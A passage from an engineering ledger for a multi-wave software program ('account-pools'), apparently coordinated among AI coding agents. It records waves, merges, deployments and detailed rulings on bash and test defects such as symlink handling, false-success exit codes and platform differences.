# Program: account-pools

Spec: `docs/superpowers/specs/2026-09-04-account-pools-design.md` (approved by the operator 2026-09-05)
Plan: six wave plans, written and numbered before the program opened —
`docs/superpowers/plans/2026-09-05-account-pools-wave{1-roster,2a-ccd-tag-placement,2b-ccd-swap-strand-crossing,3-server,4-pwa,5-docs}.md`
Workspace: `ccrc-pwa-clear-meadow` (workspace `clear-meadow`, branch `ws/clear-meadow`) — spawned by wave 1's dispatch, run 32; every later wave is dispatched fresh into it
Coordinator: `ccrc-pwa-amber-summit` (workspace `amber-summit`, branch `ws/amber-summit`) — operator-designated
2026-09-05 ("Subagent driven, and leverage CCRC capabilities fully"). Workspace-resident, not a main checkout.

The spec, the six plans and this ledger were merged to `main` BEFORE wave 1 was dispatched (docs PR from
`ws/amber-summit`), so every worker workspace is cut with its requirements in the tree — no ref-fetching.
This ledger keeps moving on `ws/amber-summit` (pushed after every wave) and lands on `main` with the final wave.

Execution shape, every wave: the worker invokes `superpowers:subagent-driven-development` on its own
workspace branch — fresh implementer subagent per task, task review after each, whole-branch review at the
end — then pushes, opens the PR and mails `wave-done`. The coordinator re-measures, reviews the PR with an
independent lens, merges, deploys (agent-first where the wave says so), and briefs the next wave.

Ledger block: **D-1663–D-1688** — minted in ONE allocator call on 2026-09-05 at plan time (floor 1689) and
FULLY DEFINED across the six plans (wave 4 defines none). It is not a reserve: a deviation found during
execution gets its own allocator call (see Decisions, "execution-time deviations").

## Waves

| # | scope | PRs | state |
|---|---|---|---|
| 1 | Roster substrate: `AccountDef.pool` + `POOL_NAME_RE`, the bare-`node` mirror (closes D-1663), `_ccrc_pool()` in `accounts.sh`, `RosterWire.pool` + project-pool wire vocabulary, `shared/poolrule.ts` (D-1664), fixture table. NOT agent-first. | run 32, PR #57 (merged `07ce360e`) | **done 2026-09-06 11:11 UTC** — 19 commits, 15 files, +1572/-70; one fix round after a three-lens coordinator review; CI 5/5 on `bf2c66f4`; deployed SERVER LANE from the merge sha, `/health` reports `07ce360e`, unit stable. D-1663, D-1664 defined; D-1741, D-1742 (two rounds), D-1743 issued mid-wave |
| 2a | `ccd` reader + `project-pool` verb + `_pool_ok` + placement + agent grant + `POOLS_CAP` + doctor + `rehome`. AGENT-FIRST. | run 33, PR #59 (merged `58ef97b6`) | **done 2026-09-07 03:11 UTC** (merge commit time; both lanes deployed after) — 38 commits + 8 fix commits, wave-done `2a4f5287`, one coordinator fix round returned 2026-09-06 21:44 UTC and closed over EIGHT rounds (the worker's five, then three more I required: the unbounded read, the two refusal routes, and the doctor's own new false PASS); CI 5/5; **deployed AGENT LANE FIRST** — `ccd` reports `58ef97b6c23ff6602c021ed55dfd9d95068257dd`, `ccrc-agent.service` active, all 16 `claude-session@*` units verified active after, then the server lane, `/health` reports the same sha. Live read-only checks: `ccd caps` lists `pools-v1`, `project-pool` is in the usage line, `ccrc doctor` PASSes with the honest untagged verdict. D-1665–D-1670 defined; D-1744, D-1796, D-1798, D-1847, D-1848, D-1849 coordinator-minted; D-1850–D-1853 worker-minted and ruled to stand |
| 2b | `ccd` deciders: auto-swap tick, strand, crossing marker, four manual verbs. AGENT-FIRST. | run 34 | opened 2026-09-07 03:15 UTC — same workspace `clear-meadow`, reclaimed (`released:false` on run 33's close is correct: 34 already held it); **dispatched 2026-09-07 09:16 UTC** — `resumed:true`, `/clear` injected, `briefQueued:true`, `skillState:present`, 8 items. The six-hour open-to-dispatch gap is this coordinator pane being compacted between the two acts, not a machinery stall: an open run holds its workspace indefinitely and nothing expires |
| 3 | Server L1/L3 (`pools.ts`, `poolrule.ts` wrapper), registry `stranded`, routes, watcher frame, health. | — | not opened |
| 4 | PWA: `accountPool`, `splitByPool`, `PoolSheet`, chips, sheets, store slot. Defines no deviation. | — | not opened |
| 5 | README, `CLAUDE.md`, `config.ts` / `ccd` comment corrections. | — | not opened |

## Decisions & deviations

- **Program shape (2026-09-05):** the operator chose subagent-driven execution and asked that ccrc's own
  capabilities be used fully. Ruling: the program runs through the coordination machinery — one run row per
  wave, a dispatched worker per wave in ONE workspace (resumed and `/clear`ed by dispatch from wave 2a on),
  briefs by mail, `wave-done` re-measured by the server, items settled only after `advance` answers `ok`.
  The worker runs SDD inside its wave; the coordinator never does a wave's own work. Costs if wrong: a
  dispatch machinery stall costs a wave's wall-clock, never its code — the plans stand on their own.
- **Docs merged first (2026-09-05):** the plans were finished and approved before execution, so they go to
  `main` in a docs-only PR ahead of wave 1 rather than living on the coordinator's branch for workers to
  fetch (the program-leverage/registry-durability precedent, D-108, existed because those plans were written
  per wave). Consequence: `deviation-refs` on every wave branch compares the same plan set against `main`
  — trivially green — and the plans' `Base: origin/main 2b15144e` line is provenance, not the base a wave is
  cut from (dispatch bases on `origin/HEAD` at spawn time).
- **Execution-time deviations (2026-09-05):** coordinator clause 10 (a worker never calls the allocator
  mid-wave) and the plans' Global Constraint (an execution-time deviation is allocated the moment it is
  found) are reconciled as: the worker writes the full entry under `D-TBD-<slug>` in the wave plan's
  `## Deviations found`, mails the coordinator (`kind:status`, `subject:deviation-request`, the slugs and
  count, this wave's `runId`), the coordinator mints exactly that many with `ccrc-api ledger allocate` and
  mails the numbers back (`kind:answer`), and the worker substitutes before `wave-done`. `dtbd.test.ts`
  refuses any surviving placeholder, so a PR cannot go green with one. No spare numbers are pre-minted —
  a minted number is defined in the same act or not minted.
- **Concurrent program:** `battlescape-operational` (MekWarLive, run 31, wave 8/9) is active. Every
  `toId:'coordinator'` mail in this program MUST carry this wave's `runId`; the runId-less form resolves
  only when exactly one program is active. Briefs restate this.
- **Deploy after wave 1:** not agent-first. Server lane only, from the merge sha; `accounts.sh` regenerates
  with `_ccrc_pool` on the fleet box only when the agent lane ships (wave 2a), so `rosterAgreement` may read
  `divergent` between the two — spec §5.3 names this as expected and the banner's remedy stands.

- **Wave 1 pre-flight (worker, 2026-09-06 06:12 UTC):** before Task 1 was dispatched the worker audited the plan against the
  tree and found one blocker plus one important defect, both in SHIPPED source rather than plan prose, plus nine
  prose defects it corrected without ledgering. I minted **D-1741** and **D-1742** for the two (allocator call,
  project `ccrc-pwa`, count 2, floor now 1743) and mailed them back — the program's own D-1663–D-1688 block is
  fully defined and is never a reserve. **D-1741** — the purity scan the plan listed for `shared/poolrule.ts`
  blanked block comments with a lazy regex whose first `/*` sat inside a LINE comment, so it swallowed the
  `import type` line, found zero imports and reded on its own vacuity tripwire; the guard would have shipped
  measuring nothing, and the task's proving mutation produced no new red. Closed by rewording the module header;
  the tripwire stays, because it is what caught it. **D-1742** — the plan mandated a comment into
  `shared/roster-json.mjs` claiming its grammar copy is pinned equal "by text extraction rather than by hope";
  nothing pins that copy (wave 2a's parity test reads `ccd/ccd` and `ccrc-doctor-checks`, never a `.mjs`, and
  `single-definition`'s source filter is `/\.tsx?$/`). Closed by naming what actually holds it — behaviour, via
  the `gen-accounts` REJECT table — and adding a row one character past the 32-char cap, the one drift that
  separates the two spellings. Ruling: both are real and worth numbers; the nine prose corrections are not.
  Cost if wrong: two ledger numbers spent on findings a reviewer would have called plan-only.

- **Wave 1 review (coordinator, 2026-09-06 09:21 UTC):** three independent lenses on the branch package — contract/spec,
  test integrity, safety/topology — none shown the others' output. Contract and safety returned MERGE with
  nothing above Minor: all nine produced names exist with the spelling later waves import, `poolRule` decides
  all eight spec cases identically with the undecidable-before-untagged precedence measured, the wire is
  additive with `FLEET_PROTO` untouched, no real identifier reaches a tracked file, and the `ccd/`+`deploy/`
  diff is genuinely empty. Test integrity returned two I re-measured and confirmed myself, both the wave's own
  recurring class in its last unswept corner — a table whose `why` claims a discrimination its rows do not
  make. **(1)** `POOL_RULE_CASES`'s `mismatch-on-a-prefix` row claims to catch a TypeScript `startsWith`; it
  catches only the project-prefixes-account direction. Measured over all 13 rows: `a.startsWith(p)` and
  `a.includes(p)` both SURVIVE; only `p.startsWith(a)` reds. The account is the shorter string, so the mirror
  row is missing. Wave 2a drives its bash `_pool_ok` through this same table, so the hole is in two languages.
  **(2)** the `gen-accounts` REJECT block is the only thing holding `roster-json.mjs`'s hand-copied
  `POOL_NAME_RE` equal to the parser's — D-1742's own conclusion — and it does not hold: three tail-charset
  widenings of the mirrored literal survive every row, because every pool row fails on its FIRST character or
  on length or type and none pairs a legal first character with an illegal tail one. Each widening makes the
  mirror LAXER than the parser, which is `hidden`'s shape exactly (D-1663). Ruling: rows are the wrong
  mechanism — I measured that no single row closes it, the class of tail widenings being open — so the fix is
  the text extraction D-1742 stopped one step short of building: extract the `.mjs` literal and assert it
  equals `POOL_NAME_RE.source`. Run returned to `working`, findings mailed as 223, one fix round.
  **Ruled NOT a fix:** a hostile string pool reaching `generate.mjs`'s emitter unescaped. Both producers refuse
  shell metacharacters before a value can arrive, `id` and `hue` ship on identical terms in the same emitter,
  and the safety lens independently called it house style. Cost if wrong: an unescaped `case` arm behind two
  validators that both refuse the inputs that would reach it. Carried here rather than fixed.
  **Not findings:** unticked plan checkboxes are this repo's norm (the last two executed plans merged to `main`
  carry them unticked); the offline-snapshot revive gap is already implemented and mutation-pinned in wave 4's
  plan.

- **Wave 1 fix round, numbering ruling (2026-09-06 09:25 UTC):** the worker asked for ONE number, not two, and argued the
  difference. **D-1743** minted for the prefix row — it asked because the defect is not only in the shipped
  fixture but in the PLAN, which lists that row verbatim with the `why` that overclaims, making it D-1741's
  class (plan-mandated text whose guard measures less than its own sentence claims) rather than a fold-in.
  Agreed. For must-fix 2 it proposed taking NO new number and amending D-1742 with a round 2 instead, since
  that entry's subject is the finding "the mirrored grammar is held equal by a comment claiming a mechanism
  nobody built" — an entry closed twice on measurements nobody took is still one finding. **Ruling: endorsed.**
  A second number there would assert to a later reader that a distinct class was discovered, and none was; one
  number, one finding, the whole history in one place. Cost if wrong: a reader tracing D-1742 must read its
  two rounds to see the class was closed by text extraction and not by the rows its first two attempts
  claimed. The worker also ACCEPTED the out-of-scope ruling on the unescaped emitter arm on the argument
  rather than on authority, adding the better reason: making `pool` the one escaped value where `id` and `hue`
  are not would itself be the inconsistency. Numbers spent outside the plan-time block so far: D-1741, D-1742,
  D-1743.

- **Wave 1 fix round VERIFIED and CLOSED (2026-09-06 11:11 UTC).** The worker's fixes were re-measured by me in an isolated
  worktree pinned at `bf2c66f4`, not accepted on report. **D-1743:** the rule table now has 14 rows, and all
  three wrong comparisons red on a named row — `a.startsWith(p)` and `a.includes(p)` on the new
  `mismatch-on-a-project-prefix`, `p.startsWith(a)` on the original — while the correct equality survives, as
  it must. The worker also found a SECOND overclaim in that same sentence which neither I nor the review
  named: the row claimed to catch a bash `==` with an unquoted right side, and no fixture pool name carries a
  glob metacharacter, so nothing there could ever exercise it. Both rows now name that hazard as UNCOVERED and
  hand it to wave 2a as a quoting assertion against `ccd`. **D-1742 round 2:** the extraction block lifts
  `POOL_NAME_RE`, `ID_RE` and `LABEL_UNSAFE_RE` out of the TEXT of both files and requires each pair equal,
  `POOL_NAME_RE` against the imported object's `.source`/`.flags` so one row measures the regex the parser
  actually runs. I measured both directions: drifting the mirror to `^[a-z][a-z0-9.-]{0,31}$` — genuinely
  laxer than the parser, D-1663's own shape — leaves **107 of 108 green, every REJECT row included**, and
  reds only the extraction, with a message naming the deploy hazard; renaming the literal so the extractor
  finds nothing reds BY NAME on its vacuity tripwire rather than passing over nothing. That is the class
  closed, not three instances of it. The REJECT table is deliberately kept: text equality proves the two files
  hold the same pattern and says nothing about whether either side APPLIES it.
- **Merged with a hand-written squash body (2026-09-06 11:11 UTC).** Eight commit-message lines in the branch quote the
  `D-TBD-` slugs the two deviations carried before their numbers were issued, one of them a subject.
  `dtbd.test.ts` scans file CONTENTS, so CI was correctly green — but GitHub's default squash body would have
  landed superseded placeholders on `main`. Verified after merge: the body on `07ce360e` carries none.
  **This is a standing rule for every later wave of this program.**

- **D-1744 (wave 2a, 2026-09-06 11:35 UTC) — the project-pool reader folded three unreadable conditions into `untagged`.**
  `_project_pool_state`'s `[[ -e "$f" ]] || { echo untagged; }`, transcribed verbatim from spec §5.4.3, reads
  `-e` FALSE as absence. I reproduced all three counter-cases myself before minting: a broken symlink, a
  symlink LOOP, and a tag under a mode-000 directory each answer FALSE, indistinguishable from a path that
  does not exist. **Ruling: this is the `no overloaded null at a seam` invariant, not a transcription slip.**
  `untagged` means unconstrained and placement may go anywhere; `unreadable` means nobody knows and placement
  must refuse — so the fold does not lose information, it INVERTS the safe default, and the mode-000 case
  answers `untagged` for every project on the box at once, silently and totally. **The spec is the half that
  is wrong:** §10's failure table already commits to "unreadable != untagged pinned on both sides", and
  §5.4.3's own comment claims ELOOP is caught at the `cat` that `-e` has made unreachable. §5.4.3's BODY is
  the defect; §10 stands. Cost if wrong: a reader of §5.4.3 finds a body its own §10 contradicts, which is
  why the correction is attached to the number rather than left in a wave's transcript.
  **Carried to wave 5** (spec/README text: correct §5.4.3's body and its comment) and **to wave 3** (its
  `readProjectPools` mirrors these four states in TypeScript; `readFileMeasured` already tells absent from
  unreadable, so it has the mechanism — what it needs is to know the polarity question is live here and
  already settled. Restate in wave 3's brief; the worker has also written it into D-1744's own entry, so it
  arrives twice rather than depending on one file being read).
  Found by the worker's own sweep for "comments asserting a mechanism that is not there" — the class its
  brief told it to watch, caught in the code it was transcribing rather than reproduced into it.

- **D-1796 (wave 2a, 2026-09-06 15:13 UTC) — PARKED WITH DISCLOSURE, and the park is CONDITIONAL.** `read -d ''` returns
  non-zero for both end-of-file and a read FAILURE, so a failure past the `-f && -r` guard answers `malformed`
  where the truth is `unreadable`. The worker parked rather than fixed, and asked to be checked because it is
  the opposite call from D-1744 on a similar shape. **Endorsed, and the distinction is the durable rule: the
  overloaded-null invariant is about CALLERS, not vocabulary.** D-1744 folded into the PERMISSIVE direction
  across a seam whose sides are handled differently (`untagged` places freely, `unreadable` refuses); this
  folds into the REFUSING direction across a seam whose sides are handled identically. Same shape, opposite
  verdict. Closing it needs a distinction bash does not expose, i.e. a fork on the 5-second supervise path —
  the one round 3 removed — to improve a MESSAGE. Wrong trade; not spent.
  **Three corrections I required in the entry, no code.** (a) The load-bearing premise — "every decider maps
  both to rc 2" — rests on `_pool_ok`, which I measured as having ZERO definitions on the branch: Task 2 is
  unwritten. That is the wave's own recurring class (an argument resting on machinery that does not exist,
  stated as fact), except the owing wave is the worker's own next task, so it must re-measure and say so
  rather than hedge. (b) The two cases differ in SEVERITY and were filed under one heading: a zero-byte
  failure is a wrong MESSAGE (placement refuses either way), while a partial read that errors after delivering
  a grammatically valid prefix answers `named <prefix>` — a POSITIVE answer permitting placement onto a pool
  the file does not name, which is decision-level. (c) A park needs an unreachability ARGUMENT, not
  "unconstructed": after the `-f` type guard the path resolves to a regular file, and for a regular file on a
  local filesystem the kernel returns a short read at EOF rather than erroring mid-stream (the `/proc/self/mem`
  case delivers zero bytes; devices and FIFOs never open); and `$REG` is not a trust boundary — whoever can
  plant a partially-erroring path there can write a wrong pool name directly.
  **THE CONDITION, to be written as a trip-wire in the entry:** the park holds only while every decider maps
  `unreadable` and `malformed` to the SAME refusal. Different MESSAGES are fine and expected. A different
  DECISION in any later wave retroactively makes this a decision-level fold and the entry must be revisited.
  **Carried to wave 3** alongside D-1744 — that file now owes TWO polarity obligations, and its
  `readFileMeasured` has the mechanism bash lacks: a failed read is `unreadable`, never `malformed`, never a
  name. Both go in wave 3's brief so they arrive twice.
  Note: the allocator floor moved 1745 -> 1797 between this wave's two requests, so another lane published and
  swept in between. Never predict a number.
- **Wave 2a Task 1 took three fix rounds, and they were earned.** The spec's reader body was wrong three
  levels deep: the tag FILE (D-1744), then `$POOLS_DIR` and `$REG` one level up, then open(2) TYPE — a FIFO or
  a symlink to `/dev/zero` made the read BLOCK FOREVER, hanging `cmd_supervise` with no exit code and no word
  on stdout, which defeats the never-dies contract harder than dying would (a supervisor that exits gets
  noticed; one that blocks does not). All closed and reproduced, and round 3 removed a fork and a subshell
  from the hot path rather than adding any.

- **D-1796 AMENDED (2026-09-06 15:17 UTC) — the worker retracted a premise, and the replacement covers only one arm.**
  It mailed a correction before my ruling reached it (the mails crossed): its own "a condition neither of us
  could construct" was FALSE for two of three arms — an EIO via a symlink to `/proc/self/mem` under the pools
  directory is trivially constructible, and its round-4 test constructs it and runs green in 39 ms. The shape
  is worth more than the slip: the phrase propagated from the round-4 dispatch into a CODE COMMENT, where the
  scoped re-reviewer caught it and reded the round — so the overstatement was about to ship inside the
  disclosure written to prevent exactly that class. Corrected in three places by the worker, self-reported
  before I acted. **Not counted against the wave; this is the behaviour the process exists to produce.**
  **My amendment: it struck reachability wholesale, and reachability is load-bearing for the second arm.**
  Its re-derivation — `_pool_ok` maps `unreadable` and `malformed` alike to rc 2, so no decider distinguishes
  them — is structural and strictly stronger than a rarity argument, but ONLY for the zero-byte arm, where the
  read delivers nothing, the token is empty and the reader answers `malformed`. **The partial-read arm never
  reaches that argument at all:** a read erroring after delivering `pool-a` from a file holding `pool-abc`
  leaves a grammatically VALID token, so the reader answers `named pool-a` — rc 0, a positive answer, and
  `_pool_ok`'s rc-2 arm is never entered. Placement proceeds onto a pool the file does not name. The caller
  argument cannot carry an arm that never becomes a caller question, so striking reachability there left it
  parked on nothing.
  **Required: two arms, two justifications, labelled.** Zero-byte parks on the CALLER argument (reachable,
  constructed, costs a message and never a placement — the strongest form the park has). Partial-read parks on
  REACHABILITY in those words: decision-level, unconstructed rather than impossible, the weaker park, carrying
  the argument for why it is judged unreachable (after the `-f` guard the path is a regular file, and regular
  files short-read at EOF rather than erroring mid-stream; `$REG` is not a trust boundary). The worker's
  instinct that "a park needing the condition to be rare was not the park I meant to make" is right for the
  first arm and wrong for the second — the second IS a rarity park and the honest move is to label it one.
  **No round spent:** a fork cannot close arm two either, since `read` never reports a short read; it would
  need a size comparison, which is a bigger change than this deserves on the supervise path.
  **The trip-wire now covers both arms:** if any later wave makes `named` reachable from a failed read, or
  gives `unreadable` and `malformed` different DECISIONS, this entry is void and reopens.

- **D-1798 (wave 2a, 2026-09-06 16:05 UTC) — `pools-v1` is advertised one wave before `--cross-pool` exists. RULED: keep the
  token in 2a, and the window is closed by MECHANISM, not by wave ordering.** The worker escalated rather than
  decided, correctly: this is a cross-wave contract. Its analysis of the hazard was right — the token gates
  exactly one server decision (may the server build a `--cross-pool` argv, wave 3), `capSupported` refuses on
  no evidence precisely because a wrong guess is a SILENT SUCCESS, and 2a advertises the token while unable to
  honour the flag. Its conclusion that only wave ORDERING stands in the way was wrong.
  **What actually closes it is the flag's POSITION.** Spec §5.6 puts `--cross-pool` LEADING, before the
  positionals, and wave 3's plan already pins that token-for-token with the reason attached: a trailing flag on
  an old ccd's `start w p wd` is a silently ignored fourth positional, while a leading one lands in a slot
  `_is_valid_wrapper` refuses. **I measured all three verbs on the worker's branch rather than trusting the
  plan:** `swap --cross-pool <id> <w>` puts the flag in `id` and the session id in `target`; `start` and
  `enable` put it in `wrapper`. All three die nonzero, so `runCcdOr502` renders a loud 502 — never the silent
  200. That holds on every ccd that has ever shipped, which is stronger than anything this program could add.
  **Required of 2a: the PIN.** The mechanism exists but the wave that CREATES the exposure measures nothing —
  wave 3 pins that its builders emit a leading flag, and nobody pins that today's ccd refuses one. Different
  claims; only the second makes the early token safe. Three assertions, no code change. The wave that creates
  an exposure owes the proof it is safe rather than borrowing one from a wave not yet written.
  **Nuance found while measuring:** `cmd_enable` runs `_lc_done enable "$id" ""` BEFORE delegating to
  `cmd_start`, so a skewed enable writes a limits-ledger entry for a bogus id and only then dies. Harmless, no
  fix, but "dies before doing anything" would be false of that verb — recorded because this program has twice
  been bitten by a disclosure claiming slightly more than it measured.
  **Option (a) — move the token to 2b — declined on the merits, not on cost:** with the position mechanism
  measured it buys nothing the flag order does not already buy, and would rewrite two other plans and this
  wave's pinned rows. The worker also fixed a comment above `echo pools-v1` that asserted `_pool_ok` runs at
  "every account decision" and that `--cross-pool` exists: measured, `_pool_ok` has ZERO call sites at
  `ccd/ccd:1279` and all three `--cross-pool` hits are comment text; it gains exactly one caller this wave.

- **D-1847 (wave 2a, 2026-09-06 16:12 UTC) — `project-pool --clear` reports success over a tag it did not remove.** The
  `rm` is guarded by `[[ -e "$POOLS_DIR/$project" ]]`, and `-e` is FALSE for a dangling symlink, so the removal
  is skipped, nothing fails for `|| die` to catch, the verb prints `untagged` and exits 0 — while the symlink
  survives, the reader still answers `unreadable`, `_pool_ok` still refuses, and placement stays BLOCKED with
  the operator told the constraint is gone. Reproduced. **The worker's framing is the right one and is why it
  earned a number: an adapter narrowing a distinction it received** — the repo's own highest-yield rule. The
  verb computes `oldstate=$(_project_pool_state "$project")` on line 14 and is HOLDING the word `unreadable`
  when it reaches the `-e` test on line 18. The reader learned this under D-1744 two lines away; the writer
  never did.
  **My addition, measured before ruling: the obvious fix does not close the class.** `[[ -e … || -L … ]]`
  leaves an identical false success one shape over — a tag under an unsearchable `$POOLS_DIR` answers FALSE to
  BOTH, since neither can stat through a mode-000 directory, so the `rm` is skipped again and the verb exits 0
  again. It would have shipped as a fixed bug. **Ruling: decide from `$oldstate`, not from any fresh filesystem
  test.** The defect is not that `-e` is the wrong predicate but that the verb asks the filesystem a SECOND
  time with different semantics, having already asked through the one reader whose job is that question — two
  readers of one fact, disagreeing, where spec §5.1 makes ccd (and so `_project_pool_state`) the authority.
  Branching on the word gives the verb one reader, closes both shapes and every shape the reader already
  handles, and inherits future reader fixes for free. Required red: the mode-000 case specifically, so the
  next person to touch it does not reach for `-L` for the same good reason.
  **Wave 3 obligation, sharpened:** its route re-reads through the agent and would answer a measured
  `unreadable` while ccd exited 0. The entry must say which side is wrong — the SERVER is right, the VERB is
  wrong, and the server's correctness is not a mitigation because a shell operator never sees the server.
- **A habit, not five slips (wave 2a, 2026-09-06 16:12 UTC).** Five present-tense comments asserting later-wave machinery in one
  wave, three of them in text the worker's own dispatches dictated. Diagnosis: dictated comment text is written
  BEFORE the code exists, so the present tense is natural and wrong at the moment of writing. The remedy is
  structural — write dictated comments in the obligation tense by default and let the wave that lands the
  machinery flip them — not more care. **Carried to wave 2b, whose plan dictates comments the same way.**

- **THE PROGRAM'S SHARPEST LESSON SO FAR (2026-09-06 16:46 UTC), from wave 2a's worker, adopted in its words:** *a false
  success is not fixed by choosing a better PREDICATE, nor even by deciding from the right AUTHORITY, until
  the ACT's result is measured against that same authority.* Three rungs, discovered one shape at a time in
  D-1847: `-e` was the wrong predicate (shape 1); `$oldstate` was the right authority and still only chose the
  right ACTION (shape 2); and `rm -f` returns 0 for a real removal, for ENOTDIR through a regular file at
  `$POOLS_DIR`, and for ENOENT through a dangling symlink there — **measured, three cases one exit code** — so
  the RESULT was still inferred from a status that cannot carry it (shape 3). Remedy: re-measure with
  `_project_pool_state` after the act and refuse unless it answers what was asked. **Carried to wave 2b and
  wave 3**, both of which ship write paths.
  I also required the ladder be applied to the verb's SET arm or its exemption argued in the entry: its
  `mkdir -p` / `printf` / `_plat_mv_notdir` chain each report failure honestly and I could construct no defect,
  but the third rung is about the exit code meaning "the state you asked for now obtains", which today means
  "three syscalls returned 0". An unexamined asymmetry between two arms of one verb is where the next shape
  hides.
- **D-1847 extended, not split (2026-09-06 16:46 UTC).** The worker asked whether shape 3 warranted its own number, since the
  mechanism differs (`-f` swallowing an error versus `-e` being false). **Ruled: extend.** Same defect, same
  verb, same act, found by the review OF its own fix — and this is the identical call as D-1742's round 2,
  already the ledger's standing shape. Splitting would tell a future reader three bugs were found where one
  defect had three shapes and taught one lesson.
- **D-1798's lock claim was MINE and it was wrong (2026-09-06 16:46 UTC).** I measured `swap --cross-pool <id> <w>` with a
  session id that is not a roster id, watched `_is_valid_wrapper` refuse the shifted target, and wrote
  "refused by `_is_valid_wrapper`" into mail 236 as a general mechanism claim — one measurement generalised
  into a ledger sentence, in the same mail that told the worker not to do that. The worker inherited it in good
  faith and its round-2 re-reviewer caught it. **Corrected:** on the swap arm the flag lands in the `id` slot,
  which is never wrapper-validated; the refusal comes from `_is_valid_wrapper` only when the shifted TARGET is
  not a roster id, and otherwise from `no registry for '--cross-pool'`. The conclusion stands — every path
  exits nonzero, the 502 is loud, the early token is safe — but by a CONJUNCTION, not one lock, so both paths
  are now pinned rather than whichever one the fixture happened to trip. D-1798's entry names the coordinator
  as the source of the wrong claim; a ledger that hides where a claim came from teaches nothing.

- **D-1848 (wave 2a, 2026-09-06 17:54 UTC) — a CLASS number, not a third instance, and the framing was ruled deliberately.**
  `[ -e "$path" ]` is FALSE for a dangling symlink and for a symlink loop, so `! -e` reads as ABSENCE when it
  is not. In ONE wave that was written independently into THREE files by three different dictated blocks: the
  reader (D-1744), the writer's `--clear` (D-1847), and the doctor's `_check_pools` (found by Task 8's review).
  **Ruled: number the RULE.** The two earlier calls this program made — D-1742's round 2, D-1847's third shape
  — were "one finding, several shapes, one site". This is one rule, three independent sites, three authors. A
  third instance number would sit in the ledger looking like a third bug, and the next reader would fix a
  fourth `-e` without seeing it was the same mistake. D-1744 and D-1847 remain as its worked examples.
  **The rule, in the worker's words:** a bare `-e` may only be used where "absent" and "present but
  unresolvable" are handled IDENTICALLY — and in this design they never are, because absent means
  UNCONSTRAINED and unresolvable means REFUSE. So `-e` must be paired with `-L`, or the question asked of
  `_project_pool_state`, the box's authority.
  **Required: SHIP THE SCAN.** The rule is greppable, and this repo's doctrine is that a comment is a request
  while a red suite is a mechanism. A test reading `ccd/ccd` and `ccd/ccrc-doctor-checks` that requires every
  `-e` on a pools path to be paired with `-L` or replaced by a reader call turns D-1848 from a lesson into a
  gate. Without it the class number is only a better-written comment. Red-first, by mutating a pairing away.
  **The doctor instance is the worst of the three and the entry says so.** Reproduced: a dangling `pools/`
  makes the doctor print `PASS pools: no project pools tagged … every project is unconstrained` on a box where
  the reader answers `unreadable` for EVERY project — the inverse of the truth, in the diagnostic surface, at
  the moment an operator consults it because nothing works. The other two fail toward a wrong ACTION; this one
  actively reassures.
- **A distinct sub-shape of the comment habit (2026-09-06 17:54 UTC): CROSS-FILE claims are as unmeasured as cross-wave ones.**
  `ccd/ccd` named "the doctor (Task 8's `pools-unlistable`)" as already agreeing with the reader; the doctor
  did not. That is not the tense habit — it makes no claim about a later wave — it was simply wrong when
  written, about a SIBLING file in the SAME wave. **A claim about any file other than the one you are editing
  is unmeasured until you open that file.** And as with every instance so far, the false one was the
  reassuring one.
- **The twelve comment overclaims split in two, and the halves have different causes (2026-09-06 17:54 UTC).** Ones that were
  wrong when written are the tense habit (dictated text precedes the code). The nine-site sweep Task 9 carries
  is the other half: claims TRUE when written that ripened into falsehood as Tasks 2, 5 and 8 landed. That is
  not an author error at all — it is the absence of anything that re-checks prose when the code beneath it
  moves. **Carried to wave 2b and wave 3**, which land machinery half a dozen of this wave's comments describe
  in advance.

- **The set arm was not exempt, and it closed a round BEFORE I asked (2026-09-06 18:08 UTC).** I probed whether
  `project-pool --pool`'s exit code meant "the state you asked for now obtains" or only "three syscalls
  returned 0". Verified on the tree: `finalstate=$(_project_pool_state "$project")` is unconditional, BOTH
  arms gate their success echo on it, and both write a `pool-tag-void` retraction to `swap.log` when the
  optimistic line above did not take effect — retracting the log as well as the exit code, which is more than
  was asked and right, since the log is the other thing an operator reads.
  **The provenance is the point and belongs in the method, not the courtesy notes:** the implementer added the
  set-arm re-measurement UNINSTRUCTED (the round-4 message asked only for `--clear`), and the re-reviewer
  refused to call it gold-plating on the argument — it measured the pre-round-4 tree and found a LIVE false
  success neither the worker nor I had named (`--pool pool-a` under an aliasing swap.log: rc 0, `tagged demo
  pool-a`, state reading `malformed`). The asymmetry I was probing for was already closed, and not by anyone
  reasoning it through: by somebody re-running a claim nobody asked them to check. That is the same thing that
  caught my own wrong lock in D-1798, and it is the method this wave should be remembered for.

- **THE THREE-AXIS RULE (2026-09-06 20:42 UTC) — this program's most portable finding, and it belongs to the PROGRAM rather
  than to any entry:** *a claim is scoped to what was measured, and the axes it can be wrong on are FILE, TIME
  and PLATFORM.* Every comment and guard defect this wave produced sits on one of them. **FILE** — D-1848: true
  of one file, false of a sibling (`ccd/ccd` said the doctor agreed with the reader; it did not). **TIME** —
  the ripened-comment class: true when written, false once Tasks 2, 5 and 8 landed. **PLATFORM** — D-1849,
  below: true on the platform it was measured on, false on the other. Carried into every remaining brief
  (2b, 3, 4, 5).
- **D-1849 (wave 2a, 2026-09-06 20:42 UTC) — `rm -f` swallows ENOTDIR on GNU and NOT on BSD, found by macOS CI on an otherwise
  green PR #59.** With a plain file at `$POOLS_DIR`, GNU returns 0 and the verb proceeds to write its swap.log
  line and then void it; BSD returns non-zero, so `|| die` fires BEFORE the append and the log is empty. **Both
  behaviours are correct** — macOS refuses earlier and writes nothing misleading — and what was wrong was the
  TEST, which encoded one platform's PATH as though it were the property. Fixed by asserting the invariant the
  finding actually established: swap.log never carries a `pool-tag` line for a refused call without a following
  `pool-tag-void`. **Ruled: its own number, NOT a fourth shape of D-1848.** D-1848 is a specific greppable
  predicate rule with a SCAN behind it; this is a different predicate, a different mechanism, caught by neither
  that scan nor that pairing. What they share is an epistemic, not a rule, and folding an epistemic into a
  numbered predicate rule would dilute the one thing that makes D-1848 worth more than three instance numbers.
  Each is exactly as strong as its own mechanism: D-1848's is a scan, D-1849's is macOS CI.
  **The correction shape is the same as the ladder's**, which is worth a reader's attention: a
  platform-specific PATH stood in for the guarantee exactly as an exit code stood in for the state. And the
  axis was not unknown here — `_plat_mv_notdir` exists in the same file because `mv` diverges the same way. The
  wave used the precedent for `mv` and wrote a fresh GNU-only assumption for `rm` beside it. Known, not
  generalised.
- **The one-fix-wave allowance was deliberately exceeded, and correctly (2026-09-06 20:42 UTC).** The worker fixed red macOS CI
  after its final fix wave and recorded it as a deviation from the execution skill rather than surfacing it.
  **Endorsed, and it needed no permission:** the cap bounds REVIEW findings, which are judgements that can
